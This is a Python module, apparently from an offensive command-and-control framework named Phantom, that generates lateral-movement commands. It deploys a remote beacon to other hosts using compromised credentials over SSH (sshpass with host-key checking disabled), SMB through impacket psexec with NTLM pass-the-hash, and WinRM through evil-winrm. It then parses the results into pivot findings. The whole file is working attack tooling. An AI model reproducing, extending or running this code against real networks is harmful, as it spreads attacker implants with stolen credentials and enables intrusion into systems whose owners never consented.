"""
lateral.py — lateral movement across the network.

Each pivot deploys a NEW beacon (our own compiled C++ beacon) to another
host in scope using already-compromised credentials. The new session
registers in the SAME Phantom C2 with its own beacon id, so the operator
sees the whole network from one console.

  - lateral_pivot: SSH (universal unix fallback)
  - smb_pivot:     PsExec-style service creation over SMB (Windows),
                   NTLM hash supported
  - winrm_pivot:   WinRM PowerShell session (Windows)
"""

from __future__ import annotations

import re
from typing import Any, Callable, Dict, List

from phantom.automation.belief import Finding, WorldModel

_IS_NTLM = re.compile(r"^[0-9a-fA-F]{32}$")


def lateral_pivot_command(host: str, username: str, password: str,
                          payload: str) -> str:
    """Cross-host beacon deploy over SSH (the universal fallback)."""
    return (f"sshpass -p {password} ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=8 {username}@{host} "
            f"\"nohup {payload} >/dev/null 2>&1 &\" && "
            f"echo PIVOT_OK host={host}")


def smb_pivot_command(host: str, username: str, password: str,
                      payload: str, domain: str = "") -> str:
    """PsExec-style beacon deploy over SMB (impacket psexec.py)."""
    if _IS_NTLM.match(password):
        auth = f"{domain}/{username}" if domain else username
        cred = f"{auth}@{host}"
        cmd = (f"psexec.py -hashes :{password} -no-pass {cred} "
               f"\"cmd /c {payload}\"")
    else:
        auth = f"{domain}/{username}" if domain else username
        cmd = (f"psexec.py {auth}:{password}@{host} "
               f"\"cmd /c {payload}\"")
    return f"{cmd} && echo PIVOT_OK host={host}"


def winrm_pivot_command(host: str, username: str, password: str,
                        payload: str, domain: str = "") -> str:
    """Beacon deploy over WinRM (evil-winrm): the PowerShell stager is
    executed inside the remote session."""
    return (f"echo '{payload}' | evil-winrm -i {host} "
            f"-u {username} -p {password} "
            f"{(('-d ' + domain) if domain else '')} && "
            f"echo PIVOT_OK host={host}")


def _pivot_interpreter(source: str) -> Callable:
    def _interp(output: str, wm: WorldModel,
                slots: Dict[str, Any]) -> List[Finding]:
        if "PIVOT_OK" not in output:
            return []
        host = slots.get("host", "")
        if not host:
            for line in output.splitlines():
                if "host=" in line:
                    host = line.split("host=")[1].strip()
                    break
        if not host:
            return []
        return [Finding(kind="pivot", key=host,
                        value={"host": host,
                               "username": slots.get("username", ""),
                               "service": slots.get("service", "")},
                        confidence=0.9, source=source,
                        evidence=output.strip()[:200])]
    return _interp


def lateral_interpreter(output: str, wm: WorldModel,
                        slots: Dict[str, Any]) -> List[Finding]:
    return _pivot_interpreter("lateral_pivot")(output, wm, slots)


def smb_pivot_interpreter(output: str, wm: WorldModel,
                          slots: Dict[str, Any]) -> List[Finding]:
    return _pivot_interpreter("smb_pivot")(output, wm, slots)


def winrm_pivot_interpreter(output: str, wm: WorldModel,
                            slots: Dict[str, Any]) -> List[Finding]:
    return _pivot_interpreter("winrm_pivot")(output, wm, slots)
